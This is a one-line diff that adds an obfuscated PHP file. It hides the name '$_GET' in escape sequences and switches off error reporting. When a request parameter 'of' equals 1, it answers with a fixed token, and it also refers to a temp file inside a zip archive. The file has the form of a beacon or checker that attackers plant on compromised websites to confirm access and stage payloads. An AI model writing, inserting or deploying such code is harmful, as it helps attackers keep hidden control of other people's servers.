@@ -1,0 +1,1 @@
+<?php  error_reporting(0); $ghMAm = array("\x5f\107\x45\x54"); (${$ghMAm[0]}["\157\x66"] == 1) && die("eu/woataeuJC2fI7MgY8KSVdyme55tXAYXl7Wn7xCKsyYbpiyOHEEf0mYJGpSJv7"); @trim("zip://f4v_69bc8ef22fc0e.zip#c_69bc8ef22fc0e.tmp"); ?>
